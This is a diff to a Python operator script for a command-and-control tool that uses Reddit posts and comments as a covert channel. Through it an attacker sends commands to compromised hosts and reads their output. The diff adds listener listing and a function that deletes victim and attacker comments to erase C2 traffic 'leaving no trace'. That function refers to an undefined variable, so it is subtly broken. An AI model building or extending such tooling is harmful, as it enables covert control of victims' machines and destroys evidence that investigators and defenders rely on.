@@ -4,11 +4,22 @@ import string
 import time
 import os
 import json
+import platform
 from prawcore import NotFound
+from praw.models import InlineImage
+from io import BytesIO
 
-#function to generate a TASKID reddit title:
-def randStr(chars = string.ascii_uppercase + string.digits, N=10):
-	return ''.join(random.choice(chars) for _ in range(N))
+
+#define the host's OS
+hostOS = platform.system()    
+
+#list all listeners (all post titles in a specific Subreddit)
+def listListeners(subreddit_name):
+    subreddit = reddit.subreddit(subreddit_name)
+
+    # Print the titles of all posts
+    for post in subreddit.hot(limit=None):
+        print("[*] " + post.title)
 	
 #post into the subreddit
 def createPost(subreddit_name, title):
@@ -35,6 +46,26 @@ def sub_exists(sub):
     except NotFound:
         exists = False
     return exists
+
+#delete all the comments in a subreddit post, leaving no trace
+def deleteComments(subreddit_name, title):
+    subreddit = reddit.subreddit(subreddit_name)
+    resp = subreddit.search(title,limit=10)
+    
+    for submission in resp:        
+        submission.comments.replace_more(limit=None)
+        for comment in submission.comments:
+            if("executed" in comment.body):
+                #delete the replies (victim's posts)
+                for outputTask in top_level_comment.replies:
+                    outputTask.delete()
+                #delete the replies (attacker's posts)
+                comment.delete()
+            else:
+                pass
+            
+    print("[+] Comments got deleted")
+
 
 #read a post with a specific title
 def readOutput(subreddit_name, title, command):
@@ -112,6 +143,13 @@ if __name__ == "__main__":
             else:
                 print("[-] The selected subreddit doesn't exist or doesn't have propper permissions. Try again with another subreddit.")
 
+        #list all listeners the operator can use
+        elif command[:14] == "list listeners":
+            if(subreddit_name == ""):
+                print("[!] Put the value of subreddit")
+            else:
+                listListeners(subreddit_name)
+
         #careful, only execute this once
         elif command[:12] == "set listener":
             listener_id = command[13:]
@@ -132,14 +170,21 @@ if __name__ == "__main__":
                     while True:
                         session_command = input(selected_listener + "> ")
 
+                        #------------------------ ALL AGENT FEATURES START HERE ------------------------
                         if(session_command == "exit"):
-                            break
-                    
-                        elif(session_command == ""):
-                            pass
+                            deleteConfirm = input("[?] Do you want to delete all the C2 traffic logs stored in Reddit before exiting? [Y/n]: ")
+                            if(deleteConfirm == "y" or deleteConfirm == "Y"):
+                                print("[*] Deleting comments...")
+                                deleteComments(subreddit_name, selected_listener)
+                                break
+                            else:
+                                break
                     
                         elif(session_command == "clear"):
-                            os.system('clear')
+                            if (hostOS == "Linux"):
+                                os.system('clear')
+                            elif (hostOS == "Windows"):
+                                os.system('cls')
                     
                         else:
                             #send the command
@@ -148,12 +193,16 @@ if __name__ == "__main__":
                             #then read the output
                             time.sleep(2) #give time for reddit to update
                             readOutput(subreddit_name, selected_listener, session_command)
+                        #------------------------ AGENT FEATURES END HERE ------------------------
                 else:
                     print("[!] Could not enter the session")
 
 
         elif command == 'clear':
-            os.system('clear')
+            if (hostOS == "Linux"):
+                os.system('clear')
+            elif (hostOS == "Windows"):
+                os.system('cls')
             
         elif command == 'exit':
             print("[*] Exiting")
@@ -162,6 +211,7 @@ if __name__ == "__main__":
         elif command == 'help':
             print("""
 set subreddit                 --> Select the subreddit where you will create the listener
+list listeners                --> List all listeners you can use within the subreddit
 set listener [session number] --> Create a post in subreddit where the traffic will ocurr
 use listener [session number] --> Interact With Each Session Individually
 run [command]                 --> Execute a cmd command
